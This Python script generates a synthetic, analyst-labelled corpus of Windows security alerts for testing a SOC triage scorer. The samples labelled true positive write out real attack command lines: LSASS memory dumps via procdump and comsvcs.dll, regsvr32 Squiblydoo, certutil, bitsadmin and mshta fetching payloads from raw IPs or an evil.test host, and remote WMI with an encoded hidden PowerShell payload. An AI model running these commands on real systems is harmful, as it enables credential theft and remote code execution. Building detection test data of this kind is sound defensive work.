#!/usr/bin/env python3
"""Generate the labelled triage corpus used by ``socrepo evaluate``.

Why a generator instead of a hand-written blob?

* **Provenance.** Every alert here is synthetic. Committing the generator makes
  it explicit *how* each alert was constructed and *why* it carries the label it
  does, rather than asking a reviewer to trust 50 opaque JSON objects.
* **Reproducibility.** Re-running this script reproduces byte-identical files, so
  the confusion matrix in CI is stable.
* **Honest ground truth.** The ``label`` on each alert is an *analyst* judgement
  written independently of the heuristic scorer. The heuristic is expected to
  disagree on the genuinely ambiguous cases — that disagreement is the entire
  point of publishing a confusion matrix. We do **not** reverse-engineer labels
  from the scorer.

The corpus is intentionally skewed toward the messy middle (benign-suspicious),
because that is where real SOC toil — and real triage value — lives.

Run:  python scripts/build_sample_corpus.py
Out:  data/sample_alerts/alerts.jsonl
      data/labels/manual_labels.csv
"""

from __future__ import annotations

import csv
import datetime as dt
import json
from dataclasses import dataclass, field
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
ALERTS = ROOT / "data" / "sample_alerts" / "alerts.jsonl"
LABELS = ROOT / "data" / "labels" / "manual_labels.csv"

BASE_TS = dt.datetime(2024, 11, 4, 9, 0, 0, tzinfo=dt.UTC)

# Compiled-rule identities (see `socrepo compile`). Keeping these in sync with
# the compiler output keeps alerts traceable to the detection that raised them.
RULES = {
    "T1197": ("100200", "Bitsadmin Download", "medium"),
    "T1105": ("100201", "Suspicious Certutil Download / Decode", "high"),
    "T1140": ("100201", "Suspicious Certutil Download / Decode", "high"),
    "T1218.005": ("100202", "Suspicious Mshta Execution", "high"),
    "T1003.001": ("100203", "LSASS Memory Dump via Procdump", "critical"),
    "T1218.010": ("100204", "Regsvr32 Remote Scriptlet Execution (Squiblydoo)", "high"),
    "T1053.005": ("100205", "Scheduled Task Creation via Schtasks", "medium"),
    "T1033": ("100206", "Whoami Execution (Discovery)", "low"),
    "T1047": ("100207", "WMIC Process Call Create", "medium"),
}


@dataclass
class Spec:
    """One synthetic alert plus its independent analyst label."""

    technique_id: str
    host: str
    user: str
    image: str
    command_line: str
    label: str  # analyst ground truth
    parent_image: str | None = None
    parent_command_line: str | None = None
    signed: bool | None = None
    note: str = ""  # why the analyst assigned this label (kept in the alert)
    extra: dict = field(default_factory=dict)


# --------------------------------------------------------------------------- #
# The corpus. Grouped by the analyst verdict for readability. The mix is
# deliberately weighted toward benign-suspicious, the operational reality.
# --------------------------------------------------------------------------- #
SPECS: list[Spec] = [
    # ---------------- clear true positives ---------------- #
    Spec("T1003.001", "FIN-WKS-07", "corp\\jmalley",
         "C:\\Tools\\procdump64.exe",
         "procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\l.dmp",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="LSASS dump to world-writable path; textbook cred theft"),
    Spec("T1218.010", "FIN-WKS-07", "corp\\jmalley",
         "C:\\Windows\\System32\\regsvr32.exe",
         "regsvr32.exe /s /n /u /i:http://185.220.101.9/a.sct scrobj.dll",
         "true_positive", parent_image="C:\\Program Files\\Microsoft Office\\winword.exe",
         signed=True, note="Squiblydoo from Office parent to raw IP"),
    Spec("T1105", "HR-WKS-02", "corp\\apatel",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -urlcache -split -f http://45.9.148.32/beacon.exe %TEMP%\\b.exe",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="certutil staging an EXE from raw IP"),
    Spec("T1218.005", "ENG-WKS-11", "corp\\dwright",
         "C:\\Windows\\System32\\mshta.exe",
         "mshta.exe http://malware.evil.test/p.hta",
         "true_positive", parent_image="C:\\Program Files\\Microsoft Office\\excel.exe",
         signed=True, note="Office spawned mshta fetching remote HTA"),
    Spec("T1053.005", "ENG-WKS-11", "corp\\dwright",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /create /sc minute /mo 1 /tn Updater /tr C:\\Users\\Public\\svc.exe /f",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="Minute-cadence persistence to public path"),
    Spec("T1047", "DC-01", "corp\\svc_backup",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic /node:10.0.0.9 process call create \"cmd /c powershell -w hidden -enc SQBFAF...\"",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="Remote WMI lateral movement with hidden encoded payload"),
    Spec("T1105", "SALES-WKS-04", "corp\\bthomas",
         "C:\\Windows\\System32\\bitsadmin.exe",
         "bitsadmin /transfer j /priority high http://91.219.236.12/x.dll C:\\ProgramData\\x.dll",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="bitsadmin transfer of DLL from raw IP"),
    Spec("T1003.001", "ENG-WKS-22", "corp\\rsingh",
         "C:\\Windows\\System32\\rundll32.exe",
         "rundll32.exe C:\\windows\\system32\\comsvcs.dll MiniDump 640 C:\\temp\\l.dmp full",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="comsvcs.dll MiniDump of lsass by pid"),

    # ---------------- benign-suspicious (the messy middle) ---------------- #
    Spec("T1033", "ENG-WKS-03", "corp\\admin_klee",
         "C:\\Windows\\System32\\whoami.exe", "whoami /all",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="admin enumerating own token; common but worth a glance"),
    Spec("T1105", "IT-WKS-01", "corp\\admin_klee",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -urlcache -split -f http://pki.corp.local/root.crt root.crt",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="certutil to INTERNAL pki host — likely legit cert mgmt"),
    Spec("T1047", "IT-WKS-01", "corp\\admin_klee",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic process call create \"cmd /c gpupdate /force\"",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="wmic process call create — attacker TTP but benign payload"),
    Spec("T1197", "SALES-WKS-09", "corp\\mgarcia",
         "C:\\Windows\\System32\\bitsadmin.exe",
         "bitsadmin /transfer u http://updates.corp.local/app.msi C:\\Temp\\app.msi",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="bitsadmin to internal update host"),
    Spec("T1053.005", "ENG-WKS-15", "corp\\rsingh",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /create /sc daily /tn CorpBackup /tr C:\\Program Files\\Backup\\run.exe /st 02:00",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="daily task to Program Files — plausible but unverified"),
    Spec("T1218.005", "MKT-WKS-06", "corp\\lchen",
         "C:\\Windows\\System32\\mshta.exe",
         "mshta.exe C:\\Users\\lchen\\AppData\\Local\\vendor\\report.hta",
         "benign_suspicious", parent_image="C:\\Windows\\explorer.exe",
         signed=True, note="local HTA from a vendor tool; not network, but mshta is rare"),
    Spec("T1047", "ENG-WKS-08", "corp\\dwright",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic csproduct get uuid",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="wmic read-only query; low signal but flagged"),
    Spec("T1105", "ENG-WKS-08", "corp\\dwright",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -decode C:\\Temp\\cert.b64 C:\\Temp\\cert.cer",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="certutil decode of a local file; classic dual-use"),
    Spec("T1033", "FIN-WKS-19", "corp\\ewong",
         "C:\\Windows\\System32\\whoami.exe", "whoami /groups",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         signed=True, note="whoami from powershell by non-admin; mild curiosity"),
    Spec("T1053.005", "IT-WKS-02", "corp\\admin_pfox",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /query /fo LIST /v",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="task enumeration by admin"),
    Spec("T1218.010", "ENG-WKS-31", "corp\\rsingh",
         "C:\\Windows\\System32\\regsvr32.exe",
         "regsvr32.exe /s C:\\Program Files\\Vendor\\plugin.dll",
         "benign_suspicious", parent_image="C:\\Windows\\explorer.exe",
         signed=True, note="local DLL registration during a software install"),
    Spec("T1105", "SALES-WKS-12", "corp\\bthomas",
         "C:\\Windows\\System32\\bitsadmin.exe",
         "bitsadmin /list /allusers",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="bitsadmin job listing; recon-ish but harmless"),
    Spec("T1047", "DC-02", "corp\\svc_sccm",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic /namespace:\\\\root\\ccm path sms_client call triggerschedule",
         "benign_suspicious", parent_image="C:\\Windows\\ccmexec.exe",
         signed=True, note="SCCM client using WMI; expected but noisy"),
    Spec("T1140", "ENG-WKS-33", "corp\\dwright",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -encode C:\\Temp\\a.bin C:\\Temp\\a.b64",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="certutil -encode; dual-use, no network"),
    Spec("T1033", "IT-WKS-03", "corp\\admin_pfox",
         "C:\\Windows\\System32\\whoami.exe", "whoami",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="bare whoami by admin"),
    Spec("T1053.005", "MKT-WKS-14", "corp\\lchen",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /create /sc onlogon /tn OneDriveSync /tr \"C:\\Users\\lchen\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe /background\"",
         "benign_suspicious", parent_image="C:\\Windows\\explorer.exe",
         signed=True, note="onlogon task to AppData — matches rule, but it is OneDrive"),
    Spec("T1218.005", "ENG-WKS-40", "corp\\rsingh",
         "C:\\Windows\\System32\\mshta.exe",
         "mshta.exe vbscript:Close(Execute(\"MsgBox 1\"))",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="inline mshta vbscript; smells bad but is a known admin snippet"),
    Spec("T1047", "ENG-WKS-41", "corp\\dwright",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic product get name,version",
         "benign_suspicious", note="wmic inventory query; unsigned parent unknown"),
    Spec("T1105", "HR-WKS-05", "corp\\apatel",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -urlcache -split -f https://cdn.jsdelivr.net/npm/x/y.js y.js",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="certutil to a public CDN over https; dev behaviour"),
    Spec("T1033", "ENG-WKS-42", "corp\\dwright",
         "C:\\Windows\\System32\\whoami.exe", "whoami /priv",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="privilege enumeration; pre-exploit recon or curiosity"),

    # ---------------- clear false positives ---------------- #
    Spec("T1033", "IT-WKS-04", "corp\\admin_klee",
         "C:\\Windows\\System32\\whoami.exe", "whoami /user",
         "false_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="admin script checking its own SID; routine"),
    Spec("T1053.005", "BUILD-01", "nt authority\\system",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /create /sc weekly /tn \"Microsoft\\Windows\\Defrag\\ScheduledDefrag\" /tr \"%windir%\\system32\\defrag.exe -c\" /ru SYSTEM",
         "false_positive", parent_image="C:\\Windows\\System32\\services.exe",
         signed=True, note="OS-native maintenance task registered by SYSTEM"),
    Spec("T1047", "IT-WKS-05", "corp\\admin_pfox",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic bios get serialnumber",
         "false_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="asset-tag lookup in a login script"),
    Spec("T1197", "IT-WKS-06", "nt authority\\system",
         "C:\\Windows\\System32\\bitsadmin.exe",
         "bitsadmin /reset /allusers",
         "false_positive", parent_image="C:\\Windows\\System32\\svchost.exe",
         signed=True, note="BITS queue reset by system servicing"),
    Spec("T1033", "FIN-WKS-25", "corp\\ewong",
         "C:\\Windows\\System32\\whoami.exe", "whoami",
         "false_positive", parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         signed=True, note="whoami emitted by a helpdesk diagnostic script"),
    Spec("T1053.005", "SALES-WKS-30", "nt authority\\system",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /create /sc daily /tn \"GoogleUpdateTaskMachineCore\" /tr \"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /c\" /ru SYSTEM /st 06:00",
         "false_positive", parent_image="C:\\Windows\\System32\\msiexec.exe",
         signed=True, note="vendor updater task from an MSI install"),
    Spec("T1047", "ENG-WKS-50", "corp\\rsingh",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic os get caption,version",
         "false_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="OS version check by an inventory agent"),
    Spec("T1033", "IT-WKS-07", "corp\\admin_klee",
         "C:\\Windows\\System32\\whoami.exe", "whoami /fqdn",
         "false_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="domain-join verification step"),
    Spec("T1197", "DEV-CI-01", "corp\\svc_ci",
         "C:\\Windows\\System32\\bitsadmin.exe",
         "bitsadmin /transfer dl https://artifactory.corp.local/agent.zip C:\\ci\\agent.zip",
         "false_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="CI runner pulling a build agent from internal artifactory"),
    Spec("T1053.005", "IT-WKS-08", "corp\\admin_pfox",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /change /tn \"CorpAV\\Scan\" /enable",
         "false_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True, note="enabling an existing AV scan task"),

    # ---------------- deliberately ambiguous edge cases ---------------- #
    # These exist to create genuine model/analyst disagreement.
    Spec("T1105", "ENG-WKS-60", "corp\\dwright",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -urlcache -split -f http://198.51.100.23/tools/nmap.exe nmap.exe",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True,
         note="raw-IP download BUT of a known tool by an engineer on a test subnet; "
              "analyst downgrades to benign-suspicious pending context. Heuristic will "
              "likely call TP on the raw IP — a documented, defensible disagreement."),
    Spec("T1003.001", "SEC-WKS-01", "corp\\svc_edr",
         "C:\\Program Files\\EDR\\sensor.exe",
         "sensor.exe --collect lsass --reason integrity-check",
         "false_positive", parent_image="C:\\Windows\\System32\\services.exe",
         signed=True,
         note="EDR sensor legitimately touching lsass; 'lsass' in cmdline but not a dump "
              "tool. Tests that the heuristic does not knee-jerk on the keyword."),
    Spec("T1218.010", "ENG-WKS-61", "corp\\rsingh",
         "C:\\Windows\\System32\\regsvr32.exe",
         "regsvr32.exe /s /i:file://C:/Users/Public/setup.sct scrobj.dll",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True,
         note="squiblydoo via local file:// from Public — no network so some scorers miss "
              "it, but the scrobj+/i: combo is malicious. Analyst: TP."),
    Spec("T1105", "MKT-WKS-20", "corp\\lchen",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -urlcache -split -f http://172.16.9.5/logo.png logo.png",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True,
         note="raw private-IP fetch of an image; awkward but internal. Model may over-call."),
    Spec("T1047", "DC-03", "corp\\svc_backup",
         "C:\\Windows\\System32\\wbem\\wmic.exe",
         "wmic /node:10.0.0.15 process call create \"cmd /c net stop backupsvc\"",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True,
         note="remote WMI stopping a service — plausible admin action, but off-hours to a "
              "DC by a service account; analyst treats as TP for investigation."),
    Spec("T1140", "ENG-WKS-62", "corp\\dwright",
         "C:\\Windows\\System32\\certutil.exe",
         "certutil.exe -decode C:\\Users\\Public\\a.b64 C:\\Users\\Public\\a.exe",
         "true_positive", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True,
         note="decode of base64 to an EXE in Public — staging. Heuristic lacks an output-"
              "extension signal and may under-call: documented false negative."),
    Spec("T1033", "ENG-WKS-63", "corp\\dwright",
         "C:\\Windows\\System32\\whoami.exe",
         "whoami /all",
         "true_positive", parent_image="C:\\Program Files\\Microsoft Office\\outlook.exe",
         signed=True,
         note="whoami spawned by Outlook — discovery immediately after a phishing open; "
              "context flips a normally-benign command to TP."),
    Spec("T1218.005", "FIN-WKS-33", "corp\\ewong",
         "C:\\Windows\\System32\\mshta.exe",
         "mshta.exe https://sharepoint.corp.local/sites/it/tool.hta",
         "benign_suspicious", parent_image="C:\\Windows\\explorer.exe",
         signed=True,
         note="mshta to internal SharePoint over https; sanctioned IT tool, still rare."),
    Spec("T1053.005", "ENG-WKS-64", "corp\\rsingh",
         "C:\\Windows\\System32\\schtasks.exe",
         "schtasks /create /sc minute /mo 5 /tn SyncTemp /tr C:\\Users\\rsingh\\AppData\\Local\\Temp\\s.exe /f",
         "true_positive", parent_image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         signed=True,
         note="5-minute task to a Temp EXE created by powershell — persistence."),
    Spec("T1197", "SALES-WKS-40", "corp\\mgarcia",
         "C:\\Windows\\System32\\bitsadmin.exe",
         "bitsadmin /transfer m https://raw.githubusercontent.com/x/y/main/s.ps1 C:\\Temp\\s.ps1",
         "benign_suspicious", parent_image="C:\\Windows\\System32\\cmd.exe",
         signed=True,
         note="bitsadmin pulling a script from GitHub raw; common dev pattern, still risky."),
]


def build() -> None:
    ALERTS.parent.mkdir(parents=True, exist_ok=True)
    LABELS.parent.mkdir(parents=True, exist_ok=True)

    alert_rows: list[dict] = []
    label_rows: list[tuple[str, str]] = []

    for i, spec in enumerate(SPECS):
        rule_id, rule_title, level = RULES[spec.technique_id]
        alert_id = f"ALRT-{i + 1:04d}"
        ts = (BASE_TS + dt.timedelta(minutes=i * 7)).isoformat()
        row = {
            "id": alert_id,
            "timestamp": ts,
            "rule_id": rule_id,
            "rule_title": rule_title,
            "level": level,
            "technique_id": spec.technique_id,
            "host": spec.host,
            "user": spec.user,
            "image": spec.image,
            "command_line": spec.command_line,
            "parent_image": spec.parent_image,
            "parent_command_line": spec.parent_command_line,
            "signed": spec.signed,
            "analyst_note": spec.note,
            **spec.extra,
        }
        alert_rows.append(row)
        label_rows.append((alert_id, spec.label))

    with ALERTS.open("w", encoding="utf-8") as fh:
        for row in alert_rows:
            fh.write(json.dumps(row, ensure_ascii=False) + "\n")

    with LABELS.open("w", encoding="utf-8", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(["alert_id", "label"])
        w.writerows(label_rows)

    dist: dict[str, int] = {}
    for _, lab in label_rows:
        dist[lab] = dist.get(lab, 0) + 1
    print(f"wrote {len(alert_rows)} alerts -> {ALERTS.relative_to(ROOT)}")
    print(f"wrote {len(label_rows)} labels -> {LABELS.relative_to(ROOT)}")
    print("label distribution:", dict(sorted(dist.items())))


if __name__ == "__main__":
    build()
